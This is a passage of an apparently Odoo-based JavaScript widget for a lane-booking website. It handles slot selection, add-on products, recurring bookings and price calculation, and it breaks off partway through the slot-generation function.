import { rpc } from "@web/core/network/rpc";
import publicWidget from "@web/legacy/js/public/public_widget";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

(function () {
    // Force reload when coming from browser history
    window.addEventListener("pageshow", function (event) {
        if (event.persisted || performance.getEntriesByType("navigation")[0]?.type === "back_forward") {
            window.location.replace("/book-lanes");
        }
    });

    // Handle back button explicitly
    window.addEventListener("popstate", function () {
        window.location.replace("/book-lanes");
    });
})();


publicWidget.registry.SlotSelection = publicWidget.Widget.extend({
    selector: ".availslot",

    events: {
        "change #datePicker": "_onDateChange",
        "click #todayBtn": "_onTodayClick",
        "click .slot": "_onSlotSelect",
        "click #confirmBtn": "_onSelectConfirm",
        "click .remove-slot": "_onRemoveSlot",
        "click .select-card": "_onReserveLaneClick",
        "click #confirmBtn": "_onSelectConfirm",
        "click .product-card button": "_onAddExtraProduct",
        "click .remove-extra-product": "_onRemoveExtraProduct",
        "change #toDate": "_onfromDateChange",
        "change #daySelector": "_onfromslotChange",
        "click #cancel_btn": "_onCancelBtn",

    },
    start: function () {
        return this._super(...arguments).then(() => {
            let today = new Date().toISOString().split("T")[0];
            if ($("#datePicker").length) {
                $("#datePicker").val(today);
            } else {
                console.warn("Date picker element not found.");
            }
            let reservedProductId = sessionStorage.getItem("reservedProductId");
            let reservedProductName = sessionStorage.getItem("reservedProductName");
            let clickTargetSelector = sessionStorage.getItem("clickTargetSelector");
            if (reservedProductName) {
                document.getElementById("selectedLane").innerText = reservedProductName;
            }

            sessionStorage.removeItem("selectedSlots");

            if (clickTargetSelector) {
                sessionStorage.removeItem("reservedProductId");
                sessionStorage.removeItem("reservedProductName");
                sessionStorage.removeItem("clickTargetSelector");

                setTimeout(() => {
                    let targetButton = $(`${clickTargetSelector}`);
                    if (targetButton.length) {
                        this._onReserveLaneClick({ currentTarget: targetButton[0] });
                        targetButton.trigger("click");
                    } else {
                        console.warn("No matching button found for Product ID:", reservedProductId);
                    }
                }, 10);
            }
        });
    },
    selectedSlots: [],
    selectedDate: "",
    slotPrices: {},
    selectedExtraProducts: [],
    selectedProductPrice: 0,

    _onAddExtraProduct: function (ev) {

        ev.preventDefault();
        let isRecurring = $("#recurringBooking").is(":checked");
        let addButton = $(ev.currentTarget);
        let cardElement = addButton.closest(".product-card");
        let productName = cardElement.find(".product-name").text();
        let productPrice = parseFloat(cardElement.find(".product-price").text().replace("$", "").trim());
        let productId = cardElement.data("product-id");
        let selectedSlotsContainer = $("#selectedSlot");
        let slotDetails = [];
        let slotDetail = [];

        Object.keys(this.selectedSlotsByLane).forEach(variantId => {
            let laneName = this.variantMap[variantId] || `Lane ${variantId}`;
            this.selectedSlotsByLane[variantId].forEach(slot => {
                let slotParts = slot.slotKey.split("-");
                let year = slotParts[1];
                let month = slotParts[2];
                let day = slotParts[3];
                let time = slotParts.slice(4).join("-");
                let formattedDate = `${year}-${month}-${day}`;
                let price = this.slotPrices[slot.slotKey] || slot.price || 0;
                slotDetails.push(`${time} on ${formattedDate} - ${laneName}`);
                slotDetail.push({
                    lane_name: laneName,
                    time: time,
                    date: formattedDate,
                    price: price
                });

            });
        });
        if (!isRecurring) {

            rpc('/check/extra-addons', {
                'product_id': productId,
                'slots': slotDetail
            }).then((response) => {
                if (response.available_extra_addons && response.available_extra_addons.length > 0) {
                    let modalBody = document.getElementById('modal-body');
                    modalBody.innerHTML = '';

                    let modalContent = `
            <p style="font-size: 18px; font-weight: bold;">
                ${productName} is already booked for the following time slots:
            </p>
            <ul style="font-size: 16px;">`;

                    response.available_extra_addons.forEach(addon => {
                        let message = `
                <li>
                    <strong style="font-size: 17px;">${addon.time}</strong> on
                    <strong style="font-size: 17px;">${addon.date}</strong>
                </li>`;
                        modalContent += message;
                    });

                    modalContent += '</ul>';
                    modalBody.innerHTML = modalContent;

                    $('#extraAddonsModal').modal('show');
                    return;
                }
                else if (response.available_extra_addons_exceed && response.available_extra_addons_exceed.length > 0) {
                    let modalBody = document.getElementById('modal-body');
                    modalBody.innerHTML = '';

                    let modalContent = `
            <p style="font-size: 18px; font-weight: bold;">
                ${productName} Exceed from Booking:
            </p>
            <ul style="font-size: 16px;">`;

                    response.available_extra_addons_exceed.forEach(addon => {
                        let message = `
                <li>
                    <strong style="font-size: 17px;">${addon}</strong>
                </li>`;
                        modalContent += message;
                    });

                    modalContent += '</ul>';
                    modalBody.innerHTML = modalContent;

                    $('#extraAddonsModal').modal('show');
                }
                else {
                    let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
                    let selectedSlotsCount = allSelectedSlots.length;
                    let totalProductPrice = productPrice;

                    if (this.selectedExtraProducts.some(p => p.productId === productId)) {
                        return;
                    }

                    this.selectedExtraProducts.push({
                        productId: productId,
                        name: productName,
                        price: totalProductPrice,
                    });

                    addButton.prop("disabled", true);

                    this._updateSelectedExtraProducts();
                    this._updateTotalPrice();
                }
            });
        }
        else {
            let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
            let selectedSlotsCount = allSelectedSlots.length;
            let totalProductPrice = productPrice;

            if (this.selectedExtraProducts.some(p => p.productId === productId)) {
                return;
            }

            this.selectedExtraProducts.push({
                productId: productId,
                name: productName,
                price: totalProductPrice,
            });

            addButton.prop("disabled", true);

            this._updateSelectedExtraProducts();

        }


    },

    _onfromslotChange: function (ev) {
        let selectedProductsContainer = $("#selectedProduct");
        let noOfDays = 0;
        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
        let selectedSlotsCount = allSelectedSlots.length / 2;

        let toDate = $("#toDate").val();
        if (isRecurring && fromDate && toDate) {
            let fromDateObj = new Date(fromDate);
            let toDateObj = new Date(toDate);
            let dayname = $("#daySelector").val();


            if (toDateObj >= fromDateObj) {
                while (fromDateObj <= toDateObj) {
                    if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                        noOfDays++;
                    }
                    fromDateObj.setDate(fromDateObj.getDate() + 1);
                }
            }
        }

        let productList = `<div class="list-group">`;
        this.selectedExtraProducts.forEach((product, index) => {
            productList += `
            <div class="list-group-item d-flex align-items-center justify-content-between">
                <span class="flex-grow-1">${product.name}</span>
                <span class="fw-bold mx-3">$${product.price.toFixed(2) * selectedSlotsCount * noOfDays}</span>
                <button class="btn btn-danger btn-sm remove-extra-product" data-product-id="${product.productId}" data-index="${index}">
                   <i class="fa fa-trash" aria-hidden="true"></i>
                </button>
            </div>`;
        });
        productList += `</div>`;
        selectedProductsContainer.html(productList);
        $("#selected_addons_count").text(this.selectedExtraProducts.length);
        let dropdown = $("#selectedproductDropdown");
        if (!dropdown.hasClass("show")) {
            dropdown.collapse("show");
        }
        this._updateSelectedSlots();
    },

    _onfromDateChange: function (ev) {
        let selectedProductsContainer = $("#selectedProduct");
        let noOfDays = 0;
        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let toDate = $("#toDate").val();
        if (isRecurring && fromDate && toDate) {
            let fromDateObj = new Date(fromDate);
            let toDateObj = new Date(toDate);
            let dayname = $("#daySelector").val();
            let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
            let selectedSlotsCount = allSelectedSlots.length / 2;


            if (toDateObj >= fromDateObj) {
                while (fromDateObj <= toDateObj) {
                    if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                        noOfDays++;
                    }
                    fromDateObj.setDate(fromDateObj.getDate() + 1);
                }
            }
        }

        let productList = `<div class="list-group">`;
        this.selectedExtraProducts.forEach((product, index) => {
            productList += `
            <div class="list-group-item d-flex align-items-center justify-content-between">
                <span class="flex-grow-1">${product.name}</span>
                <span class="fw-bold mx-3">$${product.price.toFixed(2) * selectedSlotsCount * noOfDays}</span>
                <button class="btn btn-danger btn-sm remove-extra-product" data-product-id="${product.productId}" data-index="${index}">
                   <i class="fa fa-trash" aria-hidden="true"></i>
                </button>
            </div>`;
        });
        productList += `</div>`;
        selectedProductsContainer.html(productList);
        $("#selected_addons_count").text(this.selectedExtraProducts.length);
        let dropdown = $("#selectedproductDropdown");
        if (!dropdown.hasClass("show")) {
            dropdown.collapse("show");
        }
        this._updateSelectedSlots();
    },
    _onRemoveExtraProduct: function (ev) {
        let productId = $(ev.currentTarget).data("product-id");
        this.selectedExtraProducts = this.selectedExtraProducts.filter(p => p.productId !== productId);
        this._updateSelectedExtraProducts();
        this._updateTotalPrice();
    },

    _updateSelectedExtraProducts: function () {
        let selectedProductsContainer = $("#selectedProduct");
        selectedProductsContainer.empty();
        let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
        let selectedSlotsCount = allSelectedSlots.length / 2;
        if (this.selectedExtraProducts.length === 0) {
            selectedProductsContainer.html("<p class='text-center'>No extra product selected</p>");
            return;
        }
        let noOfDays = 0;
        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let toDate = $("#toDate").val();
        if (isRecurring && fromDate && toDate) {
            let fromDateObj = new Date(fromDate);
            let toDateObj = new Date(toDate);

            let dayname = $("#daySelector").val();


            if (toDateObj >= fromDateObj) {
                while (fromDateObj <= toDateObj) {
                    if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                        noOfDays++;
                    }
                    fromDateObj.setDate(fromDateObj.getDate() + 1);
                }
            }
        }


        let productList = `<div class="list-group">`;
        this.selectedExtraProducts.forEach((product, index) => {
            if (isRecurring) {
                productList += `
            <div class="list-group-item d-flex align-items-center justify-content-between">
                <span class="flex-grow-1">${product.name}</span>
                <span class="fw-bold mx-3">$${product.price.toFixed(2) * selectedSlotsCount * noOfDays}</span>
                <button class="btn btn-danger btn-sm remove-extra-product" data-product-id="${product.productId}" data-index="${index}">
                   <i class="fa fa-trash" aria-hidden="true"></i>
                </button>
            </div>`;
            }
            else {
                productList += `
            <div class="list-group-item d-flex align-items-center justify-content-between">
                <span class="flex-grow-1">${product.name}</span>
                <span class="fw-bold mx-3">$${product.price.toFixed(2) * selectedSlotsCount}</span>
                <button class="btn btn-danger btn-sm remove-extra-product" data-product-id="${product.productId}" data-index="${index}">
                   <i class="fa fa-trash" aria-hidden="true"></i>
                </button>
            </div>`;
            }

        });
        productList += `</div>`;

        selectedProductsContainer.html(productList);
        $("#selected_addons_count").text(this.selectedExtraProducts.length);
        let dropdown = $("#selectedproductDropdown");
        if (!dropdown.hasClass("show")) {
            dropdown.collapse("show");
        }
        $(".remove-extra-product").off("click").on("click", this._removeExtraProduct.bind(this));
    },
    _removeExtraProduct: function (ev) {
        let button = $(ev.currentTarget);
        let productId = button.data("product-id");
        let productIndex = button.data("index");
        this.selectedExtraProducts.splice(productIndex, 1);
        $(`.product-card[data-product-id='${productId}'] .btn-cls`).prop("disabled", false);

        this._updateSelectedExtraProducts();
        this._updateTotalPrice();

        let currentAddonsCount = parseInt($("#selected_addons_count").text()) || 0;
        let updatedAddonsCount = Math.max(0, currentAddonsCount - 1);
        $("#selected_addons_count").text(updatedAddonsCount);

        let selectedSlotsCount = parseInt($("#selected_slot_count").text()) || 0;
        $(".hide_cls").html(`
        <span id="selected_slot_count">${selectedSlotsCount}</span> SLOT(S) and
        <span id="selected_addons_count">${updatedAddonsCount}</span> Add-Ons SELECTED
    `);
    },

    _onReserveLaneClick: function (ev) {
        let addButton = $(".btn-cls");
        let lines = sessionStorage.getItem("selectedSlots");
        if (lines) {
            addButton.each((index, button) => {
                let $button = $(button);
                let productId = $button.closest(".product-card").data("product-id");

                let isProductSelected = this.selectedExtraProducts.some(p => p.productId === productId);

                $button.prop("disabled", isProductSelected);
            });
        }
        let cardElement = $(ev.currentTarget).closest(".card-container");
        let productId = cardElement.find("input[name='product_id']").val();
        let slotSelection = $("#slotSelection");
        $("#selectedProductconfirm").val(productId);
        $("#selectedProductId").val(productId);
        $(".card-container").removeClass("selected");
        cardElement.addClass("selected");
        let button = $(ev.currentTarget);
        let buttonSelector = `[data-id='${productId}']`;
        let productName = $("#selectedLane").text().trim();
        let selectedSlotstore = sessionStorage.getItem("selectedSlots");

        if (this.selectedProductId && this.selectedProductId !== productId && selectedSlotstore) {
            $('#confirmModal').modal('show');
            var self = this;
            $('#confirmModalAction').off('click').on('click', function () {
                $('#confirmModal').modal('hide');

                sessionStorage.removeItem("selectedSlots");
                sessionStorage.clear();
                sessionStorage.setItem("reservedProductId", productId);
                sessionStorage.setItem("clickTargetSelector", buttonSelector);
                sessionStorage.setItem("reservedProductName", productName);

                location.reload();
            });

            return;
        }

        this.selectedProductId = productId;

        return rpc('/my/add_to_cart', {
            'product_id': productId
        }).then((bookedSlots) => {
            slotSelection.show();
            this._generateSlots(new Date().toISOString().split("T")[0], bookedSlots);
            slotSelection[0].scrollIntoView({ behavior: "smooth", block: "start" });
        });
    },

    _onCancelBtn: function (ev) {
        let productName = sessionStorage.getItem("productName");
        if (productName) {
            $("#selectedLane").text(productName);
        } else {
            $("#selectedLane").text("None");
        }
        $(".card").removeClass("selected-card");
        let slotSelection = $("#slotSelection");
        slotSelection.show();
        slotSelection[0].scrollIntoView({ behavior: "smooth", block: "start" });
    },

    _onSelectConfirm: function (ev) {
        let productId = $("#selectedProductconfirm").val();
        $('#cnfrprdid').val(productId);
        let formattedDate = $("#datePicker").val();

        if (!this.selectedSlotsByLane || Object.keys(this.selectedSlotsByLane).length === 0) {
            console.error("No slots selected.");
            alert("Please select at least one slot before proceeding.");
            return;
        }

        let slotDetails = [];
        let slotDetail = [];
        let totalPrice = 0;

        Object.keys(this.selectedSlotsByLane).forEach(variantId => {
            let laneName = this.variantMap[variantId] || `Lane ${variantId}`;

            this.selectedSlotsByLane[variantId].forEach(slot => {
                let slotParts = slot.slotKey.split("-");
                let year = slotParts[1];
                let month = slotParts[2];
                let day = slotParts[3];
                let time = slotParts.slice(4).join("-");

                let formattedDate = `${year}-${month}-${day}`;
                let price = this.slotPrices[slot.slotKey] || slot.price || 0;

                slotDetails.push(`${time} on ${formattedDate} - ${laneName}`);

                slotDetail.push({
                    lane_name: laneName,
                    time: time,
                    date: formattedDate,
                    price: price
                });

                totalPrice += price;
            });
        });

        let selectedAddonsDict = {};
        this.selectedExtraProducts.forEach(product => {
            selectedAddonsDict[product.productId] = product.price;
        });

        totalPrice += this.selectedProductPrice || 0;

        let $confirmBtn = $("#confirmBtn");
        $confirmBtn.prop("disabled", true).text("Loading...");

        sessionStorage.removeItem("selectedSlots");
        sessionStorage.clear();

        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let toDate = $("#toDate").val();
        let dayname = $("#daySelector").val();
        let noOfDays = 0;

        let fromDateObj = new Date(fromDate);
        let toDateObj = new Date(toDate);

        if (toDateObj >= fromDateObj) {
            while (fromDateObj <= toDateObj) {
                if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                    noOfDays++;
                }
                fromDateObj.setDate(fromDateObj.getDate() + 1);
            }
        }

        rpc('/create_slot', {
            'product_id': productId,
            'selectedDate': formattedDate,
            'slots': slotDetail,
            'price': totalPrice,
            'selectedAddonsDict': selectedAddonsDict,
            'isRecurring': isRecurring,
            'fromDate': fromDate,
            'toDate': toDate,
            'dayname': dayname,
            'noOfDays': noOfDays,
        }).then((response) => {
            // Handle error status
            if (response.status === "error") {
                let modalBody = document.getElementById('modal-body-recurring');
                modalBody.innerHTML = '';

                let modalContent = `
                <p style="font-size: 18px; font-weight: bold;">
                    ${response.message}
                </p>
                <ul style="font-size: 16px;"></ul>`;

                modalBody.innerHTML = modalContent;
                $('#recurringModalPopup').modal('show');

                $confirmBtn.prop("disabled", false).text("PROCEED");
                return;
            }

            // Handle success - redirect properly
            if (response.status === "success" && response.redirect) {
                // Use window.location.href for proper navigation (not inside iframe)
                // This prevents CORS issues
                window.top.location.href = response.redirect;
            } else if (response.redirect) {
                // Fallback for old response format
                window.location.href = response.redirect;
            }
        }).catch((error) => {
            console.error("Error in slot booking:", error);
            alert("Something went wrong! Please try again.");
            $confirmBtn.prop("disabled", false).text("PROCEED");
        });
    },

    _onDateChange: function (ev) {
        let productId = $("#selectedProductId").val();
        this.selectedDate = $("#datePicker").val();
        return rpc('/date_change_cart', {
            'product_id': productId,
            'selectedDate': this.selectedDate,
        }).then((bookedSlots) => {
            this.selectedSlots = [];
            this._generateSlots(ev.target.value, bookedSlots);
            this._updateSelectedSlots();
        })
    },

    _onTodayClick: function () {
        let today = new Date().toISOString().split("T")[0];
        $("#datePicker").val(today);
        this.selectedDate = today;
        this.selectedSlots = [];
        this._generateSlots(today);
        this._updateSelectedSlots();
    },

    _onSlotSelect: function (ev) {
        let $slot = $(ev.currentTarget);
        let variantId = $slot.data("variant-id");
        let time = $slot.data("time");
        let date = $slot.data("date");
        let productId = $("#selectedProductId").val();
        let productName = $("#selectedLane").text().trim();
        sessionStorage.setItem("productName", productName);

        let slotKey = `${variantId}-${date}-${time}`;
        let price = this.slotPrices[slotKey] || $slot.data("price") || 500;

        if (!productId) {
            console.error("Product ID is missing from slot element!");
            return;
        }

        if (!this.selectedSlotsByLane) {
            this.selectedSlotsByLane = {};
        }
        if (!this.selectedSlotsByLane[variantId]) {
            this.selectedSlotsByLane[variantId] = [];
        }

        let selectedLaneSlots = this.selectedSlotsByLane[variantId];
        let selectedSlotIndex = selectedLaneSlots.findIndex(s => s.slotKey === slotKey);
        let requiredSlots = productName === "Box Cricket" ? 2 : 2;
        if (selectedSlotIndex !== -1) {
            if (selectedLaneSlots.length === requiredSlots) {
                this.selectedSlotsByLane[variantId] = [];
                $(".slot[data-variant-id='" + variantId + "']").removeClass("selected text-white").css("background-color", "white");
                $(".slot[data-variant-id='" + variantId + "']").removeClass("selected-slot");
                this.updateCart(productId, -requiredSlots, -selectedLaneSlots.reduce((sum, s) => sum + s.price, 0));
            }

            else {
                let deselectedSlot = selectedLaneSlots.splice(selectedSlotIndex, 1)[0];
                let $deselectedSlotElem = $(".slot[data-variant-id='" + variantId + "'][data-time='" + time + "']");
                let $nextSlot = $deselectedSlotElem.next(`.slot[data-variant-id='${variantId}']`);

                $deselectedSlotElem.removeClass("selected text-white").css("background-color", "#f1f1f1");
                $deselectedSlotElem.removeClass("selected-slot");

                if ($nextSlot.length && $nextSlot.hasClass("selected")) {
                    let nextTime = $nextSlot.data("time");
                    let nextSlotKey = `${variantId}-${date}-${nextTime}`;
                    let nextSlotIndex = selectedLaneSlots.findIndex(s => s.slotKey === nextSlotKey);

                    if (nextSlotIndex !== -1) {
                        selectedLaneSlots.splice(nextSlotIndex, 1);
                    }
                    $nextSlot.removeClass("selected text-white").css("background-color", "#f1f1f1");
                    $nextSlot.removeClass("selected-slot");
                }

                this.updateCart(productId, -1, -price);
            }
            this._toggleAddButton();
            this._updateSelectedExtraProducts();
            this._updateSelectedSlots();
            return;
        }

        let slotsToSelect = [$slot];
        let nextSlot = $slot;
        let totalPrice = price;
        const convertTo24Hour = (timeStr) => {
            const [time, modifier] = timeStr.split(' ');
            let [hours, minutes] = time.split(':');
            hours = parseInt(hours);
            minutes = parseInt(minutes);

            if (modifier === 'PM' && hours !== 12) hours += 12;
            if (modifier === 'AM' && hours === 12) hours = 0;

            return hours * 60 + minutes;
        };

        if (selectedLaneSlots.length === 0) {
            for (let i = 1; i < requiredSlots; i++) {
                nextSlot = nextSlot.next(`.slot[data-variant-id='${variantId}']`);

                if (nextSlot.length > 0 && !nextSlot.hasClass("booked-slot") && !nextSlot.hasClass("selected")) {
                    let nextTime = nextSlot.data("time");
                    let nextSlotKey = `${variantId}-${date}-${nextTime}`;
                    let nextPrice = this.slotPrices[nextSlotKey] || nextSlot.data("price") || 500;

                    slotsToSelect.push(nextSlot);
                    totalPrice += nextPrice;
                } else {
                    $('#slotWarningModal').modal('show');

                    setTimeout(() => {
                        $('#slotWarningModal').modal('hide');

                        $slot.removeClass("selected text-white").css("background-color", "#f1f1f1");
                        $slot.removeClass("selected-slot");
                    }, 2000);
                    return;
                }
            }
        }
        else {
            const lastSelectedSlot = selectedLaneSlots[selectedLaneSlots.length - 1];
            const lastSelectedTime = convertTo24Hour(lastSelectedSlot.slotKey.split('-').pop());
            const currentTime = convertTo24Hour($slot.data('time'));

            if (currentTime - lastSelectedTime === 30) {
                console.log('Continuous slot detected. Selecting 1 slot.');
            }
            if ((lastSelectedTime > currentTime) && (lastSelectedTime - currentTime === 30 || lastSelectedTime - currentTime === 60)) {
                console.log('Continuous slot detected. Selecting 1 slot.(in Reverse Pattern ...)');
            }
            else {
                console.log('Non-continuous slot detected. Selecting 2 slots.');
                for (let i = 1; i < requiredSlots; i++) {
                    nextSlot = nextSlot.next(`.slot[data-variant-id='${variantId}']`);

                    if (nextSlot.length > 0 && !nextSlot.hasClass('booked-slot') && !nextSlot.hasClass('selected')) {
                        let nextTime = nextSlot.data('time');
                        let nextSlotKey = `${variantId}-${date}-${nextTime}`;
                        let nextPrice = this.slotPrices[nextSlotKey] || nextSlot.data('price') || 500;

                        slotsToSelect.push(nextSlot);
                        totalPrice += nextPrice;
                    } else {
                        console.warn('Not enough continuous slots available!');
                        return;
                    }
                }
            }
        }

        slotsToSelect.forEach(slot => {
            let slotTime = slot.data("time");
            let slotKey = `${variantId}-${date}-${slotTime}`;
            let slotPrice = this.slotPrices[slotKey] || slot.data("price") || 500;

            selectedLaneSlots.push({ slotKey: slotKey, price: slotPrice });
            slot.addClass("selected text-white").css("background-color", "#28a745");
        });

        this.updateCart(productId, slotsToSelect.length, totalPrice);
        this._saveSlotsToSession();
        this._toggleAddButton();
        this._updateSelectedSlots();
        this._updateSelectedExtraProducts();
        $("#selectedSlotDropdown").addClass("show").css("display", "block");
        $("#selectedSlotDropdown").prev("button").attr("aria-expanded", "true");
    },

    _saveSlotsToSession: function () {
        sessionStorage.setItem("selectedSlots", JSON.stringify(this.selectedSlotsByLane));
    },

    _restoreSlotsFromSession: function () {
        let savedSlots = sessionStorage.getItem("selectedSlots");
        if (savedSlots) {
            this.selectedSlotsByLane = JSON.parse(savedSlots);
            Object.keys(this.selectedSlotsByLane).forEach(variantId => {
                this.selectedSlotsByLane[variantId].forEach(slot => {
                    let $slotElem = $(".slot[data-variant-id='" + variantId + "'][data-time='" + slot.slotKey.split("-")[2] + "']");
                    if ($slotElem.length) {
                        $slotElem.addClass("selected text-white").css("background-color", "#28a745");
                    }
                });
            });
        }
    },



    //_generateSlots: function (selectedDate, bookedSlots = {}) {
    //    let tbody = $("#slotTable");
    //    tbody.empty();
    //    let productId = $("#selectedProductId").val();
    //    console.log(productId, "selectedProductId");
    //
    //    return rpc('/get_slot_prices_and_variants', {
    //        'product_id': productId
    //    }).then((response) => {
    //        let prices = response.prices;
    //        let variants = response.variants;
    //        let restrictedLanes = response.box_data;
    //        let formattedLanes = {};
    //        let newRestrictedLanes = {};
    //        let publishedLanes = response.published_lanes;
    //        let slotData = response.slot_data;
    //
    //        let selectedDay = new Date(selectedDate).toLocaleString('en-us', { weekday: 'long' }).toLowerCase();
    //        let dayPrices = slotData[selectedDay] || {};
    //
    //        for (let box in restrictedLanes) {
    //            let lanes = restrictedLanes[box].lanes;
    //            let productName = lanes[0].split(" (Lane")[0].trim();
    //            let formattedLanesArray = lanes.map(lane => {
    //                let match = lane.match(/\(Lane \d+\)/);
    //                return match ? match[0].replace(/[()]/g, "").trim() : lane;
    //            });
    //            formattedLanes[box] = {
    //                product: productName,
    //                lanes: formattedLanesArray
    //            };
    //        }
    //
    //        let originalLanes = formattedLanes;
    //        for (let box in originalLanes) {
    //            let product = originalLanes[box].product.split(",")[0].trim();
    //            let lanes = originalLanes[box].lanes;
    //            newRestrictedLanes[box] = {
    //                product: product,
    //                lanes: lanes
    //            };
    //        }
    //        restrictedLanes = newRestrictedLanes;
    //
    //        if (!variants.length) {
    //            console.error("No variants found for the product.");
    //            return;
    //        }
    //
    //        let filteredVariants = variants.filter(variant => {
    //            let laneName = variant.name;
    //            let isPublished = publishedLanes.includes(laneName);
    //            let isBoxCricket = $("#selectedLane").text().trim() === "Box Cricket";
    //            return !(isBoxCricket && !isPublished);
    //        });
    //
    //        if (!filteredVariants.length) {
    //            console.error("No published variants available.");
    //            $("#dateHeader").html("");
    //            return;
    //        }
    //
    //        this.variantMap = {};
    //        filteredVariants.forEach(variant => {
    //            this.variantMap[variant.id] = variant.name;
    //        });
    //
    //        let dateHeader = filteredVariants.map(variant => `<th>${variant.name}</th>`).join("");
    //        $("#dateHeader").html(dateHeader);
    //
    //        let morningSlots = this._getTimeSlots(dayPrices.morning_start_time, dayPrices.morning_end_time);
    //        let eveningSlots = this._getTimeSlots(dayPrices.evening_start_time, dayPrices.evening_end_time);
    //
    //        let row = "<tr>";
    //        filteredVariants.forEach(variant => {
    //            let laneName = variant.name;
    //            let laneContent = `<td class="lane-column" data-variant-id="${variant.id}" data-lane-name="${laneName}" style="padding: 5px; vertical-align: top;">`;
    //
    //            // Render morning slots
    //            morningSlots.forEach(time => {
    //                let slotKey = `${variant.id}-${selectedDate}-${time}`;
    //                let productName = $("#selectedLane").text().trim();
    //                let isBooked = this._isSlotBooked(selectedDate, time, bookedSlots, laneName, productName, restrictedLanes);
    //                let price = dayPrices.morning_price;
    //
    //                this.slotPrices[slotKey] = price;
    //
    //                let slotClass = "available-slot";
    //                if (isBooked) {
    //                    slotClass = "booked-slot";
    //                } else if (this._isPastTime(time, selectedDate)) {
    //                    slotClass = "past-slot";
    //                }
    //
    //                let slotContent = `<small class="slot-text">${isBooked ? `<del>${time}</del>` : time}<br></small>`;
    //
    //                laneContent += `<div class="slot ${slotClass}"
    //                                    data-variant-id="${variant.id}"
    //                                    data-time="${time}"
    //                                    data-date="${selectedDate}"
    //                                    data-price="${price}">
    //                                    ${slotContent}
    //                                </div>`;
    //            });
    //
    //            // Divider between morning and evening
    //            laneContent += `<div class="slot-divider" style="border-top: 1px dashed #ccc; margin: 10px 0;"></div>`;
    //
    //            // Render evening slots
    //            eveningSlots.forEach(time => {
    //                let slotKey = `${variant.id}-${selectedDate}-${time}`;
    //                let productName = $("#selectedLane").text().trim();
    //                let isBooked = this._isSlotBooked(selectedDate, time, bookedSlots, laneName, productName, restrictedLanes);
    //                let price = dayPrices.evening_price;
    //
    //                this.slotPrices[slotKey] = price;
    //
    //                let slotClass = "available-slot";
    //                if (isBooked) {
    //                    slotClass = "booked-slot";
    //                } else if (this._isPastTime(time, selectedDate)) {
    //                    slotClass = "past-slot";
    //                }
    //
    //                let slotContent = `<small class="slot-text">${isBooked ? `<del>${time}</del>` : time}<br></small>`;
    //
    //                laneContent += `<div class="slot ${slotClass}"
    //                                    data-variant-id="${variant.id}"
    //                                    data-time="${time}"
    //                                    data-date="${selectedDate}"
    //                                    data-price="${price}">
    //                                    ${slotContent}
    //                                </div>`;
    //            });
    //
    //            laneContent += `</td>`;
    //            row += laneContent;
    //        });
    //        row += "</tr>";
    //        tbody.append(row);
    //
    //        this._restoreSlotsFromSession();
    //        this._updateSelectedSlots();
    //
    //        $(".available-slot").off("click").on("click", function () {
    //            if (!$(this).hasClass("past-slot")) {
    //                $(this).toggleClass("selected-slot");
    //            }
    //        });
    //    });
    //},

    // Add this function to force reload slots after payment
    _reloadSlots: function () {
        this.lastGeneratedDate = null; // Reset cache
        this.isGeneratingSlots = false;
        let selectedDate = $("#selectedDate").val();
        if (selectedDate) {
            this._generateSlots(selectedDate);
        }
    },

    // Update _generateSlots to clear cache properly
    _generateSlots: function (selectedDate, bookedSlots = {}) {
        if (this.isGeneratingSlots) {
            console.warn("Slot generation is already in progress.");
            return;
        }

        // ✅ REMOVE THIS CHECK to allow refresh
        // if (this.lastGeneratedDate === selectedDate) {
        //     console.log("Slots already generated for this date.");
        //     return;
        // }

        this.isGeneratingSlots = true;
        this.lastGeneratedDate = selectedDate;

        let tbody = $("#slotTable");
        tbody.empty();

        let productId = $("#selectedProductId").val();

        return rpc('/get_slot_prices_and_variants', {
            'product_id': productId,
            'selected_date': selectedDate,
            '_': new Date().getTime()  // ✅ Cache buster
        }).then((response) => {
            let variants = response.variants;
            let restrictedLanes = response.box_data;
            let formattedLanes = {};
            let newRestrictedLanes = {};
            let publishedLanes = response.published_lanes;
            let slotData = response.slot_data;
            let bookedSlotsFromBackend = response.booked_slots || [];
            let peakSlots = response.peak_slots || [];
            let peakPrice = response.peak_price || 0;
            this.peakSlots = peakSlots;
            this.peakPrice = peakPrice;

            // ✅ Debug: Log booked slots
            console.log("Booked slots from backend:", bookedSlotsFromBackend);

            // ✅ Convert booked slots array to lookup object
            let bookedSlotsMap = {};
            bookedSlotsFromBackend.forEach(slot => {
                let key = `${slot.lane_name}-${slot.date}-${slot.time}`;
                bookedSlotsMap[key] = {
                    isBooked: true,
                    customerName: slot.customer_name || null
                };
                console.log("Marking as booked:", key);
            });

            let selectedDay = new Date(selectedDate).toLocaleString('en-us', { weekday: 'long' }).toLowerCase();
            let dayPrices = slotData[selectedDay] || {};

            for (let box in restrictedLanes) {
                let lanes = restrictedLanes[box].lanes;
                let productName = (lanes[0] || '').split(" (Lane")[0]?.trim() || 'Unknown';
                let formattedLanesArray = lanes.map(lane => {
                    let match = lane.match(/\(Lane \d+\)/);
                    return match ? match[0].replace(/[()]/g, "").trim() : lane;
                });
                formattedLanes[box] = {
                    product: productName,
                    lanes: formattedLanesArray
                };
            }

            let originalLanes = formattedLanes;
            for (let box in originalLanes) {
                let product = originalLanes[box].product.split(",")[0].trim();
                let lanes = originalLanes[box].lanes;
                newRestrictedLanes[box] = {
                    product: product,
                    lanes: lanes
                };
            }
            restrictedLanes = newRestrictedLanes;

            if (!variants.length) {
                console.error("No variants found for the product.");
                return;
            }

            let filteredVariants = variants.filter(variant => {
                let laneName = variant.name;
                let isPublished = publishedLanes.includes(laneName);
